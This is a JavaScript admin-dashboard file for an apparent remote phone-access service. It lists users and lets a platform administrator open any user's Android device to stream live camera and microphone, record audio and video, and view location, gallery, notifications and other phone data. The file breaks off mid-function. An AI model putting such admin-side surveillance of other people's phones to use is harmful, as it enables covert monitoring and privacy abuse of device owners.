import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  onAuthStateChanged,
  signInWithPopup,
  signInWithEmailAndPassword,
  signOut,
} from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
import { startAdminLiveViewer } from "./live.js?v=8";

/** @type {string} */
let adminGalleryFilter = "all";

/** Prevents auth-state logout from wiping an in-progress Sign in. */
let loginInProgress = false;
let authBootstrapped = false;

const viewLogin = document.getElementById("view-login");
const viewDenied = document.getElementById("view-denied");
const viewApp = document.getElementById("view-app");
const authStatus = document.getElementById("auth-status");
const adminUser = document.getElementById("admin-user");
const deniedEmail = document.getElementById("denied-email");

/** @type {string} */
let idToken = "";
/** @type {import("https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js").Auth | null} */
let auth = null;
/** @type {object | null} */
let firebaseConfig = null;
/** @type {string} */
let activeTab = "dashboard";
/** @type {object[]} */
let cachedUsers = [];
/** @type {{ stop: () => Promise<void>, enableSpeaker?: () => Promise<boolean>, sessionId?: string } | null} */
let liveViewer = null;
/** @type {string} */
let activeLiveSessionId = "";
/** @type {{ torch: boolean, micMuted: boolean, videoRec: boolean, audioRec: boolean }} */
let liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
/** @type {string} */
let openUserUid = "";
/** @type {object | null} */
let userDetailCache = null;
/** @type {{ ownerUid: string, deviceId: string, data: object, devices: object[] } | null} */
let exploreCtx = null;
/** @type {string} */
let activePhoneTab = "camera";

function show(el, on) {
  if (!el) return;
  el.hidden = !on;
}

function fmtTime(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString();
  } catch {
    return "—";
  }
}

function escapeHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

class ApiError extends Error {
  constructor(message, code, howTo, extra) {
    super(message);
    this.code = code || "";
    this.howTo = howTo || "";
    this.extra = extra || null;
  }
}

async function api(path, options = {}) {
  if (!idToken) throw new Error("Not signed in");
  const res = await fetch(path, {
    ...options,
    headers: {
      Authorization: `Bearer ${idToken}`,
      ...(options.body ? { "Content-Type": "application/json" } : {}),
      ...(options.headers || {}),
    },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new ApiError(
      data.error || data.message || `HTTP ${res.status}`,
      data.code || "",
      data.howTo || "",
      data
    );
  }
  return data;
}

function formatApiError(e) {
  if (e instanceof ApiError) {
    return e.howTo ? `${e.message}\n\nHow: ${e.howTo}` : e.message;
  }
  return e instanceof Error ? e.message : String(e);
}

function setUsersSubview(which) {
  show(document.getElementById("users-list-view"), which === "list");
  show(document.getElementById("user-detail-view"), which === "user");
  show(document.getElementById("device-control-view"), which === "device");
}

function setTab(tab) {
  activeTab = tab;
  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === tab);
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== `tab-${tab}`;
  });
  if (tab === "dashboard") void loadDashboard();
  if (tab === "users") {
    setUsersSubview("list");
    void loadUsers();
  }
  if (tab === "admins") void loadAdmins();
}

async function loadDashboard() {
  const status = document.getElementById("dashboard-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/stats");
    document.getElementById("kpi-users").textContent = String(data.users ?? 0);
    document.getElementById("kpi-devices").textContent = String(data.devices ?? 0);
    document.getElementById("kpi-online").textContent = String(data.online ?? 0);
    document.getElementById("kpi-blocked").textContent = String(data.blocked ?? 0);
    if (status) status.textContent = "Updated just now.";
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function renderUsers(users) {
  const tbody = document.getElementById("users-tbody");
  if (!tbody) return;
  if (!users.length) {
    tbody.innerHTML = `<tr><td colspan="6" class="muted">No users yet. Click Sync users.</td></tr>`;
    return;
  }
  tbody.innerHTML = users
    .map((u) => {
      const badge = u.blocked
        ? `<span class="admin-badge danger">Blocked</span>`
        : `<span class="admin-badge ok">Active</span>`;
      const email = escapeHtml(u.email || u.uid);
      return `<tr>
        <td>
          <div>${email}</div>
          <div class="muted" style="font-size:0.8rem;">${escapeHtml(u.displayName || "")}</div>
        </td>
        <td>${Number(u.deviceCount || 0)}</td>
        <td>${Number(u.onlineDeviceCount || 0)}</td>
        <td>${fmtTime(u.lastSeenAt)}</td>
        <td>${badge}</td>
        <td><button type="button" class="btn-secondary btn-user-open" data-uid="${escapeHtml(u.uid)}">Open</button></td>
      </tr>`;
    })
    .join("");
  tbody.querySelectorAll(".btn-user-open").forEach((btn) => {
    btn.addEventListener("click", () => openUser(btn.getAttribute("data-uid")));
  });
}

async function loadUsers() {
  const status = document.getElementById("users-status-text");
  const q = document.getElementById("users-search")?.value || "";
  const st = document.getElementById("users-status")?.value || "all";
  try {
    if (status) status.textContent = "Loading…";
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    if (st) params.set("status", st);
    const data = await api(`/api/admin/users?${params.toString()}`);
    cachedUsers = data.users || [];
    renderUsers(cachedUsers);
    if (status) status.textContent = `${cachedUsers.length} user(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

async function loadAdmins() {
  const list = document.getElementById("admins-list");
  const status = document.getElementById("admins-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/admins");
    const emails = data.emails || [];
    if (!list) return;
    list.innerHTML = emails
      .map(
        (email) => `<li>
          <span>${escapeHtml(email)}</span>
          <button type="button" class="btn-danger-soft btn-admin-remove" data-email="${escapeHtml(email)}">Remove</button>
        </li>`
      )
      .join("");
    list.querySelectorAll(".btn-admin-remove").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const email = btn.getAttribute("data-email");
        if (!email) return;
        if (!confirm(`Remove admin ${email}?`)) return;
        try {
          await api("/api/admin/admins", {
            method: "DELETE",
            body: JSON.stringify({ email }),
          });
          await loadAdmins();
        } catch (e) {
          alert(e instanceof Error ? e.message : String(e));
        }
      });
    });
    if (status) status.textContent = `${emails.length} admin(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

/** Open user → expand all devices full page (no side drawer). */
async function openUser(uid) {
  if (!uid) return;
  openUserUid = uid;
  void stopLiveViewer();
  exploreCtx = null;
  setUsersSubview("user");
  const title = document.getElementById("user-detail-title");
  const sub = document.getElementById("user-detail-sub");
  const actions = document.getElementById("user-detail-actions");
  const body = document.getElementById("user-detail-body");
  if (body) body.innerHTML = `<p class="muted">Loading devices…</p>`;
  try {
    const data = await api(`/api/admin/users/${encodeURIComponent(uid)}`);
    userDetailCache = data;
    const u = data.user || {};
    if (title) title.textContent = u.email || u.uid;
    if (sub) {
      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${Number(u.deviceCount || 0)} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
    }
    if (actions) {
      actions.innerHTML = u.blocked
        ? `<button type="button" class="btn-primary" id="btn-unblock">Unblock</button>`
        : `<button type="button" class="btn-danger" id="btn-block">Block user</button>`;
      document.getElementById("btn-block")?.addEventListener("click", async () => {
        const reason = prompt("Block reason (shown to the user):", "Blocked by administrator");
        if (reason == null) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/block`, {
          method: "POST",
          body: JSON.stringify({ reason }),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
      document.getElementById("btn-unblock")?.addEventListener("click", async () => {
        if (!confirm("Unblock this user?")) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/unblock`, {
          method: "POST",
          body: JSON.stringify({}),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
    }
    renderUserDetailBody(uid, data);
  } catch (e) {
    if (body) body.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
  }
}

function renderUserDetailBody(uid, data) {
  const body = document.getElementById("user-detail-body");
  if (!body) return;
  const devices = data.devices || [];
  const clients = data.trustedClients || [];
  const sessions = data.sessions || [];
  const audits = data.auditLogs || [];
  const u = data.user || {};

  const deviceCards = devices.length
    ? devices
        .map((d) => {
          const online = Boolean(d.online);
          const name = escapeHtml(d.deviceName || d.deviceId);
          const model = escapeHtml(
            [d.manufacturer, d.deviceModel].filter(Boolean).join(" ") || "Unknown model"
          );
          return `<article class="surface admin-device-card">
            <div class="admin-device-card-head">
              <div>
                <h3>${name}</h3>
                <p class="muted">${model} · Android ${escapeHtml(d.androidVersion || "?")} · App ${escapeHtml(d.appVersion || "?")}</p>
              </div>
              <div class="row-gap">
                <span class="pill ${online ? "online" : "offline"}">${online ? "Online" : "Offline"}</span>
                <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
                ${d.revoked ? `<span class="admin-badge danger">Revoked</span>` : ""}
              </div>
            </div>
            <p class="admin-device-meta">
              Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}
              · Network ${escapeHtml(d.networkType || "unknown")}
              · Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}
              · Camera ${escapeHtml(d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "n/a"))}
              · Mic ${escapeHtml(d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "n/a"))}
            </p>
            <div class="page-actions" style="margin-top:12px;">
              <button type="button" class="btn-primary btn-explore-device"
                data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}"
                ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
            </div>
          </article>`;
        })
        .join("")
    : `<div class="surface muted">No devices registered for this user.</div>`;

  body.innerHTML = `
    <h2 class="settings-section-title">All devices</h2>
    <p class="muted" style="margin-top:0;">Open Explore &amp; control for the full My Phone tabs (camera, location, gallery, …). User browsers stay paired.</p>
    <div class="admin-device-grid">${deviceCards}</div>

    <h2 class="settings-section-title">Trusted browsers</h2>
    <div class="surface">
      ${
        clients.length
          ? `<ul class="admin-readable-list">${clients
              .map((c) => {
                const admin =
                  c.clientId === "platform_admin" || c.isPlatformAdminClient
                    ? ' <span class="admin-badge ok">Admin</span>'
                    : "";
                return `<li>
                  <strong>${escapeHtml(c.label || c.clientName || c.clientId)}</strong>
                  ${admin}
                  <span class="muted"> — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")}${c.revoked ? " · revoked" : ""}</span>
                </li>`;
              })
              .join("")}</ul>`
          : `<p class="muted">No trusted browsers.</p>`
      }
    </div>

    <h2 class="settings-section-title">Recent sessions</h2>
    <div class="surface">
      ${
        sessions.length
          ? `<ul class="admin-readable-list">${sessions
              .slice(0, 15)
              .map(
                (s) =>
                  `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · <span class="muted">${fmtTime(s.createdAt || s.startedAt)}</span></li>`
              )
              .join("")}</ul>`
          : `<p class="muted">No sessions.</p>`
      }
    </div>

    <h2 class="settings-section-title">Recent audit</h2>
    <div class="surface">
      ${
        audits.length
          ? `<ul class="admin-readable-list">${audits
              .slice(0, 20)
              .map((a) => `<li>${escapeHtml(a.action || "?")} · <span class="muted">${fmtTime(a.at)}</span></li>`)
              .join("")}</ul>`
          : `<p class="muted">No audit logs.</p>`
      }
    </div>

    ${
      u.blocked
        ? `<h2 class="settings-section-title">Block info</h2>
           <div class="surface"><p>${escapeHtml(u.blockedReason || "")}</p>
           <p class="muted">by ${escapeHtml(u.blockedBy || "?")} at ${fmtTime(u.blockedAt)}</p></div>`
        : ""
    }
  `;

  body.querySelectorAll(".btn-explore-device").forEach((btn) => {
    btn.addEventListener("click", () => {
      void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
    });
  });
}

async function stopLiveViewer() {
  if (liveViewer) {
    try {
      await liveViewer.stop();
    } catch {
      /* ignore */
    }
    liveViewer = null;
  }
  activeLiveSessionId = "";
}

async function openDeviceExplore(ownerUid, deviceId) {
  if (!ownerUid || !deviceId) return;
  setUsersSubview("device");
  const ownerEl = document.getElementById("device-control-owner");
  if (ownerEl) {
    const email = userDetailCache?.user?.email || ownerUid;
    ownerEl.textContent = `Controlling ${email} · Platform Admin client (user browsers stay paired).`;
  }
  const cam = document.getElementById("admin-camera-body");
  if (cam) cam.innerHTML = `<p class="muted">Loading device…</p>`;
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
    );
    const devices = userDetailCache?.devices || [data.device];
    exploreCtx = { ownerUid, deviceId, data, devices };
    fillDeviceSelect(devices, deviceId);
    setPhoneTab(activePhoneTab || "camera");
    renderAllPhonePanels();
  } catch (e) {
    if (cam) cam.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
  }
}

function fillDeviceSelect(devices, selectedId) {
  const sel = document.getElementById("admin-device-select");
  const hint = document.getElementById("admin-device-hint");
  if (!sel) return;
  sel.innerHTML = (devices || [])
    .map((d) => {
      const id = d.deviceId || d.id;
      const label = `${d.deviceName || id}${d.online ? " (online)" : " (offline)"}`;
      return `<option value="${escapeHtml(id)}" ${id === selectedId ? "selected" : ""}>${escapeHtml(label)}</option>`;
    })
    .join("");
  const d = (devices || []).find((x) => (x.deviceId || x.id) === selectedId) || {};
  if (hint) {
    hint.textContent = [
      [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
      d.androidVersion ? `Android ${d.androidVersion}` : "",
      d.batteryLevel != null ? `battery ${d.batteryLevel}%` : "",
    ]
      .filter(Boolean)
      .join(" · ");
  }
}

function setPhoneTab(tab) {
  activePhoneTab = tab;
  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
    const on = btn.getAttribute("data-phone-tab") === tab;
    btn.classList.toggle("active", on);
    btn.setAttribute("aria-selected", on ? "true" : "false");
  });
  document.querySelectorAll("#device-control-view .phone-tab-panel").forEach((panel) => {
    panel.hidden = panel.getAttribute("data-phone-panel") !== tab;
  });
}

function kvRows(obj, keys) {
  if (!obj || typeof obj !== "object") return "";
  const entries = keys
    ? keys.map(([k, label]) => [label || k, obj[k]])
    : Object.entries(obj).map(([k, v]) => [k, v]);
  return entries
    .filter(([, v]) => v !== undefined && v !== null && v !== "")
    .map(([label, v]) => {
      let display = v;
      if (typeof v === "boolean") display = v ? "Yes" : "No";
      else if (typeof v === "object") display = JSON.stringify(v);
      else if (typeof v === "number" && String(label).toLowerCase().includes("at")) {
        display = fmtTime(v);
      } else display = String(v);
      return `<div class="admin-kv"><span class="muted">${escapeHtml(label)}</span><strong>${escapeHtml(display)}</strong></div>`;
    })
    .join("");
}

function emptyHint(text) {
  return `<p class="muted">${escapeHtml(text)}</p>`;
}

function renderAllPhonePanels() {
  if (!exploreCtx) return;
  renderCameraPanel();
  renderLocationPanel();
  renderInfoPanel();
  renderGalleryPanel();
  renderNotificationsPanel();
  renderMessagesPanel();
  renderCallLogsPanel();
  renderContactsPanel();
  renderFilesPanel();
  renderScreenPanel();
  renderRecordingPanel();
  renderAppsPanel();
  wireAdminCommands();
}

function renderCameraPanel() {
  const el = document.getElementById("admin-camera-body");
  if (!el || !exploreCtx) return;
  const d = exploreCtx.data.device || {};
  const cam =
    d.cameraPermission || (d.cameraAvailable !== false ? "granted" : "missing");
  const mic =
    d.microphonePermission || (d.microphoneAvailable !== false ? "granted" : "missing");
  const liveOpen = Boolean(activeLiveSessionId && liveViewer);
  el.innerHTML = `
    <article class="device-card surface" style="padding:16px;">
      <h3>${escapeHtml(d.deviceName || exploreCtx.deviceId)}</h3>
      <div class="device-meta">
        <span class="pill ${d.online ? "online" : "offline"}">${d.online ? "Online" : "Offline"}</span>
        <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
        <span>${escapeHtml(d.manufacturer || "")} ${escapeHtml(d.deviceModel || "")}</span>
        <span>Android ${escapeHtml(d.androidVersion || "?")}</span>
        <span>App ${escapeHtml(d.appVersion || "?")}</span>
        <span>Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}${d.isCharging ? " (charging)" : ""}</span>
        <span>Network ${escapeHtml(d.networkType || "unknown")}</span>
        <span>Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}</span>
        <span>Camera ${escapeHtml(cam)} · Mic ${escapeHtml(mic)}</span>
      </div>
      <div class="connect-panel" style="margin-top:12px;">
        <div class="cap-row">
          <label><input type="radio" name="admin-cap" value="both" checked /> Camera + mic</label>
          <label><input type="radio" name="admin-cap" value="camera" /> Camera only</label>
          <label><input type="radio" name="admin-cap" value="mic" /> Mic only</label>
        </div>
        <label>Preferred quality
          <select id="admin-quality" class="quality-select input">
            <option value="auto">Auto (720p)</option>
            <option value="1080">1080p</option>
            <option value="720" selected>720p</option>
            <option value="480">480p</option>
            <option value="360">360p</option>
          </select>
        </label>
        <div class="connect-actions">
          <button type="button" class="btn-primary" id="btn-admin-connect">Connect</button>
          <button type="button" class="btn-danger" id="btn-admin-end-live" ${liveOpen ? "" : "hidden"}>End Session</button>
        </div>
        <p id="live-status" class="live-status muted">Idle — Connect starts live view. With Accessibility ON, the phone should auto-open the session (same for normal users). Otherwise tap the phone notification.</p>
        <div class="live-panel" id="admin-live-panel" ${liveOpen ? "" : "hidden"}>
          <video id="admin-live-video" class="admin-live-video live-video" autoplay playsinline muted controls></video>
          <audio id="admin-live-audio" class="live-audio" autoplay playsinline></audio>
          <p class="muted" style="margin-top:8px;">Live mic is on the phone stream. Tap <strong>Enable speaker</strong> if you hear no voice.</p>
          <div class="live-controls" id="admin-live-controls" ${liveOpen ? "" : "hidden"}>
            <button type="button" class="btn-enable-sound" id="btn-admin-speaker">Enable speaker</button>
            <button type="button" data-live-cmd="SWITCH_CAMERA">Switch camera</button>
            <button type="button" data-live-toggle="torch" aria-pressed="false">Torch: OFF</button>
            <button type="button" data-live-toggle="mic" aria-pressed="false">Mic: ON</button>
            <button type="button" data-live-cmd="CAPTURE_PHOTO">Capture photo</button>
            <button type="button" data-live-toggle="video-rec" aria-pressed="false">Start video</button>
            <button type="button" data-live-toggle="audio-rec" aria-pressed="false">Record audio file</button>
            <button type="button" class="btn-end-live" data-live-cmd="END_SESSION">End session</button>
          </div>
        </div>
      </div>
    </article>
  `;
  document.getElementById("btn-admin-connect")?.addEventListener("click", () => {
    const mode = document.querySelector('input[name="admin-cap"]:checked')?.value || "both";
    const caps =
      mode === "camera"
        ? ["camera"]
        : mode === "mic"
          ? ["microphone"]
          : ["camera", "microphone"];
    const quality = document.getElementById("admin-quality")?.value || "auto";
    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, caps, false, quality);
  });
  document.getElementById("btn-admin-end-live")?.addEventListener("click", () => {
    void endAdminLive("client_ended");
  });
  wireLiveControls();
}

function wireLiveControls() {
  document.getElementById("btn-admin-speaker")?.addEventListener("click", async () => {
    const ok = liveViewer?.enableSpeaker ? await liveViewer.enableSpeaker() : false;
    const st = document.getElementById("live-status");
    if (st) {
      st.textContent = ok
        ? "Speaker enabled"
        : "Browser blocked speaker — tap Enable speaker again after media starts";
    }
  });
  document.querySelectorAll("[data-live-cmd]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void sendLiveCommand(btn.getAttribute("data-live-cmd")).catch(() => {});
    });
  });
  document.querySelectorAll("[data-live-toggle]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void toggleLiveControl(btn.getAttribute("data-live-toggle"), btn).catch(() => {});
    });
  });
}

async function sendLiveCommand(action) {
  if (!exploreCtx || !activeLiveSessionId) {
    const st = document.getElementById("live-status");
    if (st) st.textContent = "No active session for commands.";
    return;
  }
  const act = String(action || "").trim().toUpperCase();
  const st = document.getElementById("live-status");
  try {
    if (act === "END_SESSION") {
      await endAdminLive("client_ended");
      return;
    }
    await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/session/command`,
      {
        method: "POST",
        body: JSON.stringify({ sessionId: activeLiveSessionId, action: act }),
      }
    );
    if (st) st.textContent = `Command ${act} sent`;
  } catch (e) {
    if (st) st.textContent = formatApiError(e);
    throw e;
  }
}

async function toggleLiveControl(toggle, btn) {
  if (!activeLiveSessionId) return;
  try {
    if (toggle === "torch") {
      const next = !liveControlState.torch;
      await sendLiveCommand(next ? "TORCH_ON" : "TORCH_OFF");
      liveControlState.torch = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Torch: ON" : "Torch: OFF";
      }
    } else if (toggle === "mic") {
      const nextMuted = !liveControlState.micMuted;
      await sendLiveCommand(nextMuted ? "MIC_MUTE" : "MIC_UNMUTE");
      liveControlState.micMuted = nextMuted;
      if (btn) {
        btn.setAttribute("aria-pressed", nextMuted ? "true" : "false");
        btn.textContent = nextMuted ? "Mic: OFF" : "Mic: ON";
      }
    } else if (toggle === "video-rec") {
      const next = !liveControlState.videoRec;
      await sendLiveCommand(next ? "START_VIDEO_RECORDING" : "STOP_VIDEO_RECORDING");
      liveControlState.videoRec = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Stop video" : "Start video";
      }
    } else if (toggle === "audio-rec") {
      const next = !liveControlState.audioRec;
      await sendLiveCommand(next ? "START_AUDIO_RECORDING" : "STOP_AUDIO_RECORDING");
      liveControlState.audioRec = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Stop audio file" : "Record audio file";
      }
    }
  } catch {
    /* status already set in sendLiveCommand */
  }
}

async function endAdminLive(reason) {
  const st = document.getElementById("live-status");
  const ownerUid = exploreCtx?.ownerUid;
  const deviceId = exploreCtx?.deviceId;
  const sessionId = activeLiveSessionId;
  try {
    if (ownerUid && deviceId && sessionId) {
      await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/end`,
        { method: "POST", body: JSON.stringify({ sessionId, reason: reason || "admin_ended" }) }
      ).catch(() => {});
    }
  } finally {
    await stopLiveViewer();
    activeLiveSessionId = "";
    liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
    show(document.getElementById("admin-live-panel"), false);
    show(document.getElementById("admin-live-controls"), false);
    const endBtn = document.getElementById("btn-admin-end-live");
    if (endBtn) endBtn.hidden = true;
    if (st) st.textContent = "Live session ended.";
  }
}

function renderLocationPanel() {
  const el = document.getElementById("admin-location-body");
  if (!el || !exploreCtx) return;
  const loc = exploreCtx.data.location;
  const d = exploreCtx.data.device || {};
  if (!loc || !Number.isFinite(Number(loc.latitude))) {
    el.innerHTML = emptyHint(
      d.locationSharingEnabled
        ? "No GPS fix cached yet. Tap Update location, wait a few seconds, then Refresh."
        : "Location sharing may be off on the phone. Tap Update location to request a fix."
    );
    return;
  }
  const lat = Number(loc.latitude);
  const lng = Number(loc.longitude);
  const maps = `https://www.google.com/maps?q=${lat},${lng}`;
  el.innerHTML = `
    <div class="admin-kv-grid">
      ${kvRows(
        {
          Latitude: lat.toFixed(6),
          Longitude: lng.toFixed(6),
          Accuracy: loc.accuracy != null ? `${loc.accuracy} m` : "—",
          Provider: loc.provider || "—",
          Captured: fmtTime(loc.capturedAt || loc.updatedAt),
        },
        null
      )}
    </div>
    <p style="margin-top:12px;"><a class="btn-primary" href="${maps}" target="_blank" rel="noopener">Open in Google Maps</a></p>
  `;
}

function flattenInfo(info) {
  if (!info || typeof info !== "object") return {};
  const out = {};
  const walk = (obj, prefix = "") => {
    for (const [k, v] of Object.entries(obj)) {
      if (k === "id" || k === "ownerUid") continue;
      const key = prefix ? `${prefix}.${k}` : k;
      if (v && typeof v === "object" && !Array.isArray(v)) walk(v, key);
      else if (Array.isArray(v)) out[key] = v.slice(0, 8).join(", ");
      else out[key] = v;
    }
  };
  walk(info);
  return out;
}

function renderInfoPanel() {
  const el = document.getElementById("admin-info-body");
  if (!el || !exploreCtx) return;
  const d = exploreCtx.data.device || {};
  const info = flattenInfo(exploreCtx.data.deviceInfo);
  const sessions = exploreCtx.data.activeSessions || [];
  el.innerHTML = `
    <h2 class="settings-section-title" style="margin-top:0;">Device status</h2>
    <div class="admin-kv-grid">
      ${kvRows({
        Name: d.deviceName,
        Model: [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
        Android: d.androidVersion,
        "App version": d.appVersion,
        Online: d.online,
        "Remote control": d.remoteControlEnabled !== false,
        Battery: d.batteryLevel != null ? `${d.batteryLevel}%` : "—",
        Charging: d.isCharging,
        Network: d.networkType,
        "Last seen": fmtTime(d.lastSeenAt),
        Camera: d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "off"),
        Microphone: d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "off"),
        "Location sharing": d.locationSharingEnabled,
        Gallery: d.galleryAccessEnabled,
        "File manager": d.fileManagerEnabled,
      })}
    </div>
    <h2 class="settings-section-title">Synced device information</h2>
    ${
      Object.keys(info).length
        ? `<div class="admin-kv-grid">${kvRows(info)}</div>`
        : emptyHint("No cached info yet. Tap Refresh Information, wait, then Refresh.")
    }
    <h2 class="settings-section-title">Active sessions</h2>
    ${
      sessions.length
        ? `<ul class="admin-readable-list">${sessions
            .map(
              (s) =>
                `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · client ${escapeHtml(s.clientId || "")} · ${fmtTime(s.startedAt || s.createdAt)}</li>`
            )
            .join("")}</ul>`
        : emptyHint("No active sessions.")
    }
  `;
}

function renderGalleryPanel() {
  const el = document.getElementById("admin-gallery-body");
  if (!el || !exploreCtx) return;
  document.querySelectorAll("#admin-gallery-filters .gallery-filter").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-gallery-filter") === adminGalleryFilter);
    btn.onclick = () => {
      adminGalleryFilter = btn.getAttribute("data-gallery-filter") || "all";
      renderGalleryPanel();
    };
  });
  document.getElementById("btn-admin-gallery-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );

  let items = exploreCtx.data.gallery || [];
  if (adminGalleryFilter !== "all") {
    items = items.filter((g) => String(g.type || "").toLowerCase() === adminGalleryFilter);
  }
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No gallery items cached for this filter. Tap Request index, wait a few seconds, then Refresh."
    );
    return;
  }
  el.innerHTML = `<div class="admin-item-grid">${items
    .slice(0, 80)
    .map((g) => {
      const id = String(g.itemId || g.id || "");
      const name = g.displayName || g.name || id;
      const type = String(g.type || "file").toLowerCase();
      const actionLabel =
        type === "image" ? "View" : type === "audio" || type === "video" ? "Play / Download" : "Download";
      return `<article class="admin-item-card" data-item-id="${escapeHtml(id)}">
        <strong>${escapeHtml(name)}</strong>
        <span class="muted">${escapeHtml(type)}</span>
        <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span>
        <span class="muted">${g.sizeBytes != null ? `${Math.round(Number(g.sizeBytes) / 1024)} KB` : ""}</span>
        <div class="admin-gallery-actions">
          <button type="button" class="btn-primary btn-admin-gallery-open"
            data-item-id="${escapeHtml(id)}"
            data-type="${escapeHtml(type)}"
            data-name="${escapeHtml(name)}"
            data-mime="${escapeHtml(g.mimeType || "")}"
            data-size="${Number(g.sizeBytes || 0)}">${actionLabel}</button>
        </div>
      </article>`;
    })
    .join("")}</div>`;
  el.querySelectorAll(".btn-admin-gallery-open").forEach((btn) => {
    btn.addEventListener("click", () => {
      void openAdminGalleryItem({
        itemId: btn.getAttribute("data-item-id"),
        type: btn.getAttribute("data-type"),
        displayName: btn.getAttribute("data-name"),
        mimeType: btn.getAttribute("data-mime"),
        sizeBytes: Number(btn.getAttribute("data-size") || 0),
      });
    });
  });
}

function renderNotificationsPanel() {
  const el = document.getElementById("admin-notifications-body");
  if (!el || !exploreCtx) return;
  document.getElementById("btn-admin-notif-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );
  const items = exploreCtx.data.notifications || [];
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No notifications cached.\n\nOn the phone: Permissions → Notification access ON, then Sync from phone here."
    );
    return;
  }
  el.innerHTML = `<div class="notif-grid">${items
    .slice(0, 80)
    .map((n) => {
      const title = escapeHtml(n.title || "(No title)");
      const message = escapeHtml(n.message || n.text || n.body || "");
      const app = escapeHtml(n.appLabel || n.appName || n.packageName || "App");
      return `<article class="notif-card">
        <div class="notif-card-head">
          <strong class="notif-title">${title}</strong>
          <time class="notif-time muted">${escapeHtml(fmtTime(n.postedAt || n.createdAt))}</time>
        </div>
        <p class="notif-message">${message || '<span class="muted">(No message text)</span>'}</p>
        <div class="notif-meta muted">${app}</div>
      </article>`;
    })
    .join("")}</div>`;
}

async function openAdminGalleryItem(item) {
  if (!exploreCtx || !item?.itemId) return;
  const viewer = document.getElementById("admin-media-viewer");
  const body = document.getElementById("admin-media-body");
  const title = document.getElementById("admin-media-title");
  const status = document.getElementById("admin-media-status");
  show(viewer, true);
  if (title) title.textContent = item.displayName || item.itemId;
  if (body) body.textContent = "Requesting file from phone…";
  if (status) status.textContent = "Starting transfer…";
  try {
    const started = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
      {
        method: "POST",
        body: JSON.stringify({
          itemId: item.itemId,
          displayName: item.displayName,
          mimeType: item.mimeType,
          sizeBytes: item.sizeBytes,
        }),
      }
    );
    const transferId = started.transfer?.transferId || started.transferId;
